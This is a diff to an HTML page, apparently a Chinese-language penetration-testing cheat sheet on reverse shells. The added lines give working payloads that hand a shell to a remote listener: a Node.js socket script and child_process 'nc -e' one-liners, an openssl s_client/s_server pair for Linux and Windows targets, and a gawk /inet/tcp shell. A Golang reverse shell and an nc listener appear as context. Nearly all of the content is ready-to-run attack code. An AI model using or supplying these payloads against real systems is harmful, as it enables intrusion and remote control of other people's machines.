@@ -164,6 +164,45 @@ rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</s
 <p>Golang</p>
 <div class="highlight"><pre><span></span><span class="nt">echo</span> <span class="s1">'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span> <span class="o">&amp;&amp;</span> <span class="nt">go</span> <span class="nt">run</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span> <span class="o">&amp;&amp;</span> <span class="nt">rm</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span>
 </pre></div>
+<p>Nodejs</p>
+<div class="highlight"><pre><span></span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"net"</span><span class="p">),</span>
+        <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"child_process"</span><span class="p">),</span>
+        <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">,</span> <span class="p">[]);</span>
+    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
+    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">8080</span><span class="p">,</span> <span class="s2">"10.17.26.64"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
+        <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
+        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+    <span class="p">});</span>
+    <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents the Node.js application form crashing</span>
+<span class="p">})();</span>
+
+
+<span class="nx">or</span>
+
+<span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">'nc -e /bin/sh [IPADDR] [PORT]'</span><span class="p">)</span>
+
+<span class="nx">or</span>
+
+<span class="o">-</span><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">global</span><span class="p">.</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span>
+<span class="o">-</span><span class="nx">x</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">'nc [IPADDR] [PORT] -e /bin/bash'</span><span class="p">)</span>
+</pre></div>
+<p>用openssl 反弹shell</p>
+<p>攻击者</p>
+<div class="highlight"><pre><span></span>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="m">365</span> -nodes <span class="c1">#Generate certificate</span>
+openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port&gt; <span class="c1">#Here you will be able to introduce the commands</span>
+openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; <span class="c1">#Here yo will be able to get the response</span>
+</pre></div>
+<p>靶机</p>
+<div class="highlight"><pre><span></span><span class="c1">#Linux</span>
+openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;<span class="p">|</span>/bin/bash<span class="p">|</span>openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT2&gt;
+
+<span class="c1">#Windows</span>
+openssl.exe s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;<span class="p">|</span>cmd.exe<span class="p">|</span>openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT2&gt;
+</pre></div>
+<div class="highlight"><pre><span></span>awk <span class="s1">'BEGIN {s = "/inet/tcp/0/&lt;IP&gt;/&lt;PORT&gt;"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null
+</pre></div>
 <p>在带有公网的机器上开启监听</p>
 <div class="highlight"><pre><span></span>nc -nvlp <span class="m">1234</span>
 </pre></div>
